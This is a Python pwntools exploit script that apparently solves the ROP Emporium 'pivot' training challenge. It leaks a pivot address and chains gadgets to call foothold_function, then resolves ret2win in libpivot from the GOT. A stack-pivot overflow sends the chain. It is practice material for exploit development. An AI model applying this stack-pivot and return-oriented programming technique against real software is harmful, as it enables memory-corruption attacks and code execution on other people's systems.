from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary, checksec=False)
l = ELF('./libpivot.so', checksec=False)
r = ROP(e)
stage1 = ROP(e)
stage2 = ROP(e)

gs = '''
break *0x400720
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


p = start()

padding = r.generatePadding(0, cyclic_find(b'kaaa'))
pop_rax = r.find_gadget(['pop rax', 'ret'])[0]
xchg_rax = 0x4009bd
foothold_plt = e.plt['foothold_function']
pop_rax = r.find_gadget(['pop rax', 'ret'])[0]
foothold_got = e.got['foothold_function']
load_rax = 0x4009c0
pop_rbp = r.find_gadget(['pop rbp', 'ret'])[0]
offset = l.sym['ret2win']-l.sym['foothold_function']
add_rax_rbp = 0x4009c4
call_rax = 0x4006b0

print("Foothold PLT: %s" % hex(foothold_plt))

p.recvuntil(b'pivot: 0x')
addr = int(p.recv(12), 16)

stage2.call(foothold_plt)
stage2.call(pop_rax)
stage2.raw(p64(foothold_got))
stage2.call(load_rax)
stage2.call(pop_rbp)
stage2.raw(offset)
stage2.call(add_rax_rbp)
stage2.call(call_rax)

log.info("stage2 chain:\n%s" % stage2.dump())
p.sendline(bytes(stage2))

stage1.call(pop_rax)
stage1.raw(p64(addr))
stage1.call(xchg_rax)

log.info("stage1 chain:\n%s" % stage1.dump())
p.recvuntil(b'Now please send your stack smash')
p.sendline(padding + bytes(stage1))

p.interactive()
